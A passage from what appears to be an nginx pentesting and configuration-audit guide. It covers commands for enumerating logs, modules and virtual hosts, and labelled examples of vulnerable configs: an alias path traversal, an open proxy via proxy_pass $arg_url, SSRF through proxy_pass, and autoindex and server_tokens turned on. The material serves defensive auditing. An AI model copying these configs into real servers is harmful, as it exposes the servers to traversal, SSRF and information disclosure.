class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$http_referer\u0026#34;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"s\"\u003e\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$http_user_agent\u0026#34;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$http_x_forwarded_for\u0026#34;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eaccess_log\u003c/span\u003e \u003cspan class=\"s\"\u003e/var/log/nginx/access.log\u003c/span\u003e \u003cspan class=\"s\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eerror_log\u003c/span\u003e \u003cspan class=\"s\"\u003e/var/log/nginx/error.log\u003c/span\u003e \u003cspan class=\"s\"\u003ewarn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Custom log for specific location\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/api/\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eaccess_log\u003c/span\u003e \u003cspan class=\"s\"\u003e/var/log/nginx/api.log\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"log-file-analysis\"\u003eLog File Analysis\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find nginx log files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /var/log -name \u003cspan class=\"s2\"\u003e\u0026#34;*nginx*\u0026#34;\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;access_log\\|error_log\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Analyze access logs for reconnaissance\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etail -f /var/log/nginx/access.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep \u003cspan class=\"s2\"\u003e\u0026#34;404\u0026#34;\u003c/span\u003e /var/log/nginx/access.log \u003cspan class=\"p\"\u003e|\u003c/span\u003e head -20\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep \u003cspan class=\"s2\"\u003e\u0026#34;POST\u0026#34;\u003c/span\u003e /var/log/nginx/access.log \u003cspan class=\"p\"\u003e|\u003c/span\u003e head -10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Look for error patterns\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etail -f /var/log/nginx/error.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -i \u003cspan class=\"s2\"\u003e\u0026#34;error\\|fail\\|denied\u0026#34;\u003c/span\u003e /var/log/nginx/error.log\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"module-and-extension-analysis\"\u003eModule and Extension Analysis\u003c/h2\u003e\n\u003ch3 id=\"loaded-modules\"\u003eLoaded Modules\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check compiled modules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enginx -V 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -o with-\u003cspan class=\"o\"\u003e[\u003c/span\u003ea-z_\u003cspan class=\"o\"\u003e]\u003c/span\u003e*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enginx -V 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -o without-\u003cspan class=\"o\"\u003e[\u003c/span\u003ea-z_\u003cspan class=\"o\"\u003e]\u003c/span\u003e*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check dynamic modules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /etc/nginx/modules-enabled/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /usr/lib/nginx/modules/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check module loading in config\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;load_module\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"security-relevant-modules\"\u003eSecurity-Relevant Modules\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for security modules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enginx -V 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -i \u003cspan class=\"s2\"\u003e\u0026#34;security\\|waf\\|firewall\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for authentication modules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enginx -V 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -i \u003cspan class=\"s2\"\u003e\u0026#34;auth\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for rate limiting modules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enginx -V 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -i \u003cspan class=\"s2\"\u003e\u0026#34;limit\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for SSL/TLS modules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enginx -V 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -i \u003cspan class=\"s2\"\u003e\u0026#34;ssl\\|tls\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"configuration-testing-and-validation\"\u003eConfiguration Testing and Validation\u003c/h2\u003e\n\u003ch3 id=\"syntax-testing\"\u003eSyntax Testing\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Test nginx configuration syntax\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enginx -t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enginx -T  \u003cspan class=\"c1\"\u003e# Test and dump configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Test specific configuration file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enginx -t -c /path/to/nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check configuration hierarchy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enginx -T \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -E \u003cspan class=\"s2\"\u003e\u0026#34;^#|server_name|listen|location\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"runtime-analysis\"\u003eRuntime Analysis\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check running nginx processes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eps aux \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check listening ports\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ess -tlnp \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetstat -tlnp \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check nginx status (if enabled)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl http://localhost/nginx_status\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"common-misconfigurations\"\u003eCommon Misconfigurations\u003c/h2\u003e\n\u003ch3 id=\"path-traversal-issues\"\u003ePath Traversal Issues\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Vulnerable alias configuration\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/files\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003ealias\u003c/span\u003e \u003cspan class=\"s\"\u003e/var/www/files/\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Missing trailing slash can cause path traversal\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Correct configuration\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/files/\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003ealias\u003c/span\u003e \u003cspan class=\"s\"\u003e/var/www/files/\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"information-disclosure\"\u003eInformation Disclosure\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Version disclosure\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eserver_tokens\u003c/span\u003e \u003cspan class=\"no\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Should be off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Autoindex enabled\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eautoindex\u003c/span\u003e \u003cspan class=\"no\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# May expose directory contents\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Error page information disclosure\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eerror_page\u003c/span\u003e \u003cspan class=\"mi\"\u003e404\u003c/span\u003e \u003cspan class=\"s\"\u003e/404.html\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Should use custom error pages\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"proxy-misconfigurations\"\u003eProxy Misconfigurations\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Open proxy vulnerability\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/proxy\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_pass\u003c/span\u003e \u003cspan class=\"nv\"\u003e$arg_url\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Dangerous - allows arbitrary URLs\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SSRF via proxy_pass\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"p\"\u003e~\u003c/span\u003e \u003cspan class=\"sr\"\u003e/proxy/(.+)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_pass\u003c/span\u003e \u003cspan class=\"s\"\u003ehttp://\u003c/span\u003e\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Can access internal services\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"extraction-commands-for-pentesting\"\u003eExtraction Commands for Pentesting\u003c/h2\u003e\n\u003ch3 id=\"quick-configuration-extraction\"\u003eQuick Configuration Extraction\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Extract all server names (virtual hosts)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;server_name\u0026#34;\u003c/span\u003e /etc/nginx/ \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -u\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Extract all proxy_pass destinations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;proxy_pass\u0026#34;\u003c/span\u003e /etc/nginx/ \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -u\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Extract all document roots\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;root \u0026#34;\u003c/span\u003e /etc/nginx/ \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -u\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Extract all listening ports\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;listen\u0026#34;\u003c/span\u003e /etc/nginx/ \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -u\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"one-liner-configuration-analysis\"\u003eOne-liner Configuration Analysis\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Complete nginx configuration dump\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /etc/nginx -name \u003cspan class=\"s2\"\u003e\u0026#34;*.conf\u0026#34;\u003c/span\u003e -exec cat \u003cspan class=\"o\"\u003e{}\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Extract virtual hosts with their configurations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eawk \u003cspan class=\"s1\"\u003e\u0026#39;/server_name/ {server=$2} /listen/ {port=$2} /root/ {docroot=$2} /}/ {print server, port, docroot; server=\u0026#34;\u0026#34;; port=\u0026#34;\u0026#34;; docroot=\u0026#34;\u0026#34;}\u0026#39;\u003c/span\u003e /etc/nginx/sites-enabled/*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find potential security issues\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r -E \u003cspan class=\"s2\"\u003e\u0026#34;(server_tokens on|autoindex on|proxy_pass \\$|allow all)\u0026#34;\u003c/span\u003e 